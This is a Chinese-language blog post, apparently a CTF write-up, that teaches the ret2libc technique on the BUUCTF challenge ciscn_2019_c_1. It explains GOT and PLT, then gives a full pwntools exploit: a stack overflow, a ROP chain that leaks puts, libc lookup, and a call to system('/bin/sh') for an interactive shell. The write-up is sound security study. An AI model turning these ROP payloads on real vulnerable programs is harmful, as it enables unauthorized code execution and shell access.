@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>pwn学习之ret2libc | Mr.BW的妙妙屋</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部收起"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">pwn学习之ret2libc</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">六月 3, 2024&nbsp;&nbsp;21:57:55</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/ctf/">ctf</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h1><ol>
+<li><p>当题目中开启了nx保护</p>
+</li>
+<li><p>题目中所给的文件没有system函数和&#x2F;bin&#x2F;sh</p>
+</li>
+<li><p>程序中有输入输出函数</p>
+</li>
+</ol>
+<p>当满足这些条件时我们就可以考虑ret2libc</p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><ul>
+<li><p>首先，需要找到libc文件中的system函数地址和&#x2F;bin&#x2F;sh字符串的地址</p>
+</li>
+<li><p>其次，构造ROP链，让程序去执行<code>system(/bin/sh)</code></p>
+</li>
+</ul>
+<p>由于所给的文件中没有system和binsh，因此要在libc库中找到对应的真实地址</p>
+<p>寻找真实地址需要下面的公式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数的真实地址 = 基地址 + 偏移地址</span><br></pre></td></tr></table></figure>
+
+<p>因此就产生了一个问题：如何找到偏移量</p>
+<h2 id="got表和plt表"><a href="#got表和plt表" class="headerlink" title="got表和plt表"></a>got表和plt表</h2><p>got表（global offset table）用于储存外部函数的在内存中的确切地址，找到了system和binsh的got表地址再找到偏移量就能调用<code>system(/bin/sh)</code>了</p>
+<p>plt表（procedure link table）存放函数的入口地址，ida反编译出来的函数地址就是plt地址，用plt表可以执行程序中有的函数</p>
+<p>找到真实地址和基地址后就可以计算出偏移地址，就能找到对应的libc版本</p>
+<h1 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">BUUCTF在线评测 (buuoj.cn)</a> ciscn_2019_c_1</p>
+<p><img src="/../image/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bret2libc/1.png" alt="1"></p>
+<p>开启了nx保护</p>
+<p>拖入ida中没发现system函数</p>
+<p>shift+f12也没看见binsh</p>
+<p>程序中有<code>puts() gets()</code>这两个输入输出函数</p>
+<p>因此可以考虑ret2libc</p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>main函数</p>
+<p><img src="/../image/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bret2libc/2.png" alt="2"></p>
+<p>发现上来先输入<code>1</code>才能让程序跳出循环继续执行</p>
+<p>encrypt函数</p>
+<p><img src="/../image/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bret2libc/3.png" alt="3"></p>
+<p>就是输入一个字符串s然后给s各种加密最后再输出加密后的s</p>
+<h2 id="泄露libc版本"><a href="#泄露libc版本" class="headerlink" title="泄露libc版本"></a>泄露libc版本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">main=<span class="number">0x400b28</span></span><br><span class="line">pop_rdi=<span class="number">0x400c83</span></span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br></pre></td></tr></table></figure>
+
+<p>先设置rdi寄存器储存puts函数的got表地址</p>
+<p>再通过plt表调用puts函数，输出的是puts的got表地址</p>
+<p>再让他回到main函数，这样就可以让程序重新走一遍再一次构造ROP</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts_addr=u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>
+
+<p>接受puts的got表地址然后再输出出来</p>
+<p>输出出来的地址可通过：<a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc database search (blukat.me)</a>查询libc版本（不推荐，因为经常能找出一大堆版本，不知道是不是我打开方式有问题）</p>
+<p>这里我们直接用LibcSearcher库来找libc版本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>找到对应版本后算出偏移量再找到system和binsh的地址</p>
+<h2 id="调用system"><a href="#调用system" class="headerlink" title="调用system"></a>调用system</h2><p>之后再次构造rop链</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br></pre></td></tr></table></figure>
+
+<p>调用system需要栈对齐，要填充ret</p>
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#r=remote(&#x27;node5.buuoj.cn&#x27;,28952)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">r=process(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x400b28</span></span><br><span class="line">pop_rdi=<span class="number">0x400c83</span></span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>会发现有两个libc版本对应，挨个试，发现第二个可以</p>
+<p>这题本地怎么都跑不通，连接远端服务器后就行，我估计是ubuntu版本太低了</p>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/ctf/"># ctf</a>
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0/"># 学习</a>
+                    
+                        <a href="/tags/ret%E7%B3%BB%E5%88%97/"># ret系列</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/05/29/%E5%B9%B2%E8%B4%A7%EF%BC%8C%E5%A6%82%E4%BD%95%E7%AA%81%E7%A0%B4B%E7%AB%99%E6%B8%AF%E6%BE%B3%E5%8F%B0%E9%99%90%E5%88%B6/">干货，如何突破B站港澳台限制</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
